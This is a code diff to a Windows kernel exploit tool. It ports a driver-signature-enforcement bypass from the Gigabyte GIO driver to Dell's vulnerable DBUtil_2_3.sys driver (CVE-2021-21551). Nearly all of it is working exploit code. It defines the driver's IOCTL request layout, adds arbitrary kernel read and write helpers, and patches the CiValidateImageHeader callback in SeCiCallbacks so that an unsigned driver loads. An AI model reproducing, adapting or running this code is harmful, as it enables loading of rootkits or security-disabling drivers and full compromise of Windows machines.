@@ -9,25 +9,30 @@
 #define NT_MACHINE					L"\\Registry\\Machine\\"
 #define SVC_BASE					NT_MACHINE L"System\\CurrentControlSet\\Services\\"
 
-// Gigabyte GIO device name and type, and IOCTL code for memcpy call
-#define GIO_DEVICE_NAME				L"\\Device\\GIO"
-#define FILE_DEVICE_GIO				(0xc350)
-#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
+// Dell DBUtil_2_3.sys driver (CVE-2021-21551) device name and IOCTL
+#define DBUTIL_DEVICE_NAME		L"\\Device\\DBUtil_2_3"
+#define IOCTL_DBUTIL			0x9B0C1EC4
 
-// Input struct for IOCTL_GIO_MEMCPY
+// DBUtil virtual memory operations
+#define DBUTIL_READ_VIRTUAL		2
+#define DBUTIL_WRITE_VIRTUAL	3
+
+// Input struct for IOCTL_DBUTIL (48 bytes)
+typedef struct _DBUTIL_IO_REQUEST
+{
+	ULONG64 Pad0;
+	ULONG64 Operation;		// 2 = read virtual, 3 = write virtual
+	ULONG64 Address;		// kernel virtual address
+	ULONG64 Pad1;
+	ULONG64 Buffer;		// user-mode buffer pointer
+	ULONG64 Size;			// size in bytes
+} DBUTIL_IO_REQUEST, *PDBUTIL_IO_REQUEST;
 
 struct seCiCallbacks_swap
 {
 	DWORD64 ciValidateImageHeaderEntry;
 	DWORD64 zwFlushInstructionCache;
 };
-
-typedef struct _GIOMemcpyInput
-{
-	ULONG64 Dst;
-	ULONG64 Src;
-	DWORD Size;
-} GIOMemcpyInput, *PGIOMemcpyInput;
 
 static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 
@@ -264,7 +269,7 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 {
 	Printf(L"[*] Windows NT %lu.%lu (Build %lu)\n",
 		RtlNtMajorVersion(), RtlNtMinorVersion(),
-		*reinterpret_cast<PULONG>(0x7FFE0000 + 0x0260)); // NtBuildNumber from SharedUserData
+		*reinterpret_cast<PULONG>(0x7FFE0000 + 0x0260) & 0xFFFF); // NtBuildNumber from SharedUserData
 
 	Printf(L"[!] Searching pattern...\n");
 
@@ -337,7 +342,14 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	Printf(L"[*] Kernel SeCiCallbacks : %p\n", kernelAddress);
 
 	// Resolve kernel ZwFlushInstructionCache address (harmless stub used as replacement)
-	DWORD64 zwFlushInstructionCache = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache") - uNtAddr + (DWORD64)kModuleBase;
+	DWORD64 uZwFlush = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache");
+	if (uZwFlush == 0)
+	{
+		Printf(L"[!] Failed to resolve ZwFlushInstructionCache export\n");
+		FreeLibrary(uNt);
+		return seCiCallbacks_swap{ 0, 0 };
+	}
+	DWORD64 zwFlushInstructionCache = uZwFlush - uNtAddr + (DWORD64)kModuleBase;
 
 	// CiValidateImageHeader entry is at offset 0x20 in the SeCiCallbacks struct
 	DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;
@@ -432,12 +444,12 @@ OpenDeviceHandle(
 	_In_ BOOLEAN PrintErrors
 	)
 {
-	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(GIO_DEVICE_NAME);
+	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(DBUTIL_DEVICE_NAME);
 	OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&DeviceName, OBJ_CASE_INSENSITIVE);
 	IO_STATUS_BLOCK IoStatusBlock;
 
 	const NTSTATUS Status = NtCreateFile(DeviceHandle,
-										SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
+										SYNCHRONIZE,
 										&ObjectAttributes,
 										&IoStatusBlock,
 										nullptr,
@@ -448,10 +460,48 @@ OpenDeviceHandle(
 										nullptr,
 										0);
 
-	if (!NT_SUCCESS(Status) && PrintErrors) // The first open is expected to fail; don't spam the user about it
+	if (!NT_SUCCESS(Status) && PrintErrors)
 		Printf(L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status);
 
 	return Status;
+}
+
+// Read a QWORD from a kernel virtual address via DBUtil
+static NTSTATUS ReadKernelQword(HANDLE DeviceHandle, DWORD64 Address, DWORD64* Value)
+{
+	DBUTIL_IO_REQUEST req = { 0 };
+	req.Operation = DBUTIL_READ_VIRTUAL;
+	req.Address = Address;
+	req.Buffer = (ULONG64)Value;
+	req.Size = sizeof(DWORD64);
+
+	IO_STATUS_BLOCK IoStatusBlock;
+	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+	return NtDeviceIoControlFile(DeviceHandle,
+		nullptr, nullptr, nullptr,
+		&IoStatusBlock,
+		IOCTL_DBUTIL,
+		&req, sizeof(req),
+		&req, sizeof(req));
+}
+
+// Write a QWORD to a kernel virtual address via DBUtil
+static NTSTATUS WriteKernelQword(HANDLE DeviceHandle, DWORD64 Address, DWORD64 Value)
+{
+	DBUTIL_IO_REQUEST req = { 0 };
+	req.Operation = DBUTIL_WRITE_VIRTUAL;
+	req.Address = Address;
+	req.Buffer = (ULONG64)&Value;
+	req.Size = sizeof(DWORD64);
+
+	IO_STATUS_BLOCK IoStatusBlock;
+	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+	return NtDeviceIoControlFile(DeviceHandle,
+		nullptr, nullptr, nullptr,
+		&IoStatusBlock,
+		IOCTL_DBUTIL,
+		&req, sizeof(req),
+		&req, sizeof(req));
 }
 
 
@@ -524,15 +574,12 @@ TriggerExploit(
 	_In_ PWSTR DriverServiceName
 	)
 {
-
-
-	// First try to open the device without loading the driver. This only works if it was already loaded
+	// First try to open the device without loading the driver (may already be loaded)
 	HANDLE DeviceHandle;
 	NTSTATUS Status = OpenDeviceHandle(&DeviceHandle, FALSE);
-	// if not already loaded 
 	if (!NT_SUCCESS(Status))
 	{
-		// Load the Gigabyte loader driver
+		// Load the DBUtil loader driver
 		Status = LoadDriver(LoaderServiceName);
 		if (!NT_SUCCESS(Status))
 		{
@@ -546,7 +593,7 @@ TriggerExploit(
 			return Status;
 	}
 
-	// Find where to write
+	// Resolve the SeCiCallbacks addresses
 	seCiCallbacks_swap w = getCiValidateImageHeaderEntry();
 	if (w.ciValidateImageHeaderEntry == 0 || w.zwFlushInstructionCache == 0)
 	{
@@ -554,30 +601,17 @@ TriggerExploit(
 		NtClose(DeviceHandle);
 		return STATUS_NOT_FOUND;
 	}
-	Printf(L"[!] Where: %p\n", w.ciValidateImageHeaderEntry);
-	Printf(L"[!] What : %p\n", w.zwFlushInstructionCache);
-	
-	// Read the original CiValidateImageHeader callback pointer so we can restore it later
-	GIOMemcpyInput MemcpyInput;
-	IO_STATUS_BLOCK IoStatusBlock;
-	DWORD64 originalCallback = 0;
-	MemcpyInput.Src = w.ciValidateImageHeaderEntry;
-	MemcpyInput.Dst = (ULONG64)&originalCallback;
-	MemcpyInput.Size = 8;
+	Printf(L"[*] Target : %p\n", w.ciValidateImageHeaderEntry);
+	Printf(L"[*] Replace: %p\n", w.zwFlushInstructionCache);
 
-	RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
-	Status = NtDeviceIoControlFile(DeviceHandle,
-		nullptr, nullptr, nullptr,
-		&IoStatusBlock,
-		IOCTL_GIO_MEMCPY,
-		&MemcpyInput, sizeof(MemcpyInput),
-		nullptr, 0);
+	// Read the original CiValidateImageHeader callback pointer
+	DWORD64 originalCallback = 0;
+	Status = ReadKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, &originalCallback);
 	if (!NT_SUCCESS(Status))
 	{
 		Printf(L"[!] Read primitive failed: %08X\n", Status);
 		goto Cleanup;
 	}
-
 	Printf(L"[*] Original Callback : %p\n", originalCallback);
 
 	// Sanity check: the original pointer should be a valid kernel-mode address
@@ -589,26 +623,13 @@ TriggerExploit(
 	}
 
 	// Overwrite CiValidateImageHeader with ZwFlushInstructionCache (harmless stub)
+	Status = WriteKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, w.zwFlushInstructionCache);
+	if (!NT_SUCCESS(Status))
 	{
-		DWORD64 replacement = w.zwFlushInstructionCache;
-		MemcpyInput.Src = (ULONG64)&replacement;
-		MemcpyInput.Dst = w.ciValidateImageHeaderEntry;
-		MemcpyInput.Size = 8;
-
-		RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
-		Status = NtDeviceIoControlFile(DeviceHandle,
-			nullptr, nullptr, nullptr,
-			&IoStatusBlock,
-			IOCTL_GIO_MEMCPY,
-			&MemcpyInput, sizeof(MemcpyInput),
-			nullptr, 0);
-		if (!NT_SUCCESS(Status))
-		{
-			Printf(L"[!] Write primitive (patch) failed: %08X\n", Status);
-			goto Cleanup;
-		}
-		Printf(L"[*] Patched CiValidateImageHeader -> ZwFlushInstructionCache\n");
+		Printf(L"[!] Write primitive (patch) failed: %08X\n", Status);
+		goto Cleanup;
 	}
+	Printf(L"[*] Patched CiValidateImageHeader -> ZwFlushInstructionCache\n");
 
 	// Load the unsigned target driver (CI check is now bypassed)
 	{
@@ -622,19 +643,9 @@ TriggerExploit(
 
 	// ALWAYS restore the original callback, even if driver load failed
 	{
-		MemcpyInput.Src = (ULONG64)&originalCallback;
-		MemcpyInput.Dst = w.ciValidateImageHeaderEntry;
-		MemcpyInput.Size = 8;
-
-		RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
-		Status = NtDeviceIoControlFile(DeviceHandle,
-			nullptr, nullptr, nullptr,
-			&IoStatusBlock,
-			IOCTL_GIO_MEMCPY,
-			&MemcpyInput, sizeof(MemcpyInput),
-			nullptr, 0);
-		if (!NT_SUCCESS(Status))
-			Printf(L"[!] CRITICAL: Failed to restore callback: %08X\n", Status);
+		NTSTATUS RestoreStatus = WriteKernelQword(DeviceHandle, w.ciValidateImageHeaderEntry, originalCallback);
+		if (!NT_SUCCESS(RestoreStatus))
+			Printf(L"[!] CRITICAL: Failed to restore callback: %08X\n", RestoreStatus);
 		else
 			Printf(L"[*] Restored original callback\n");
 	}
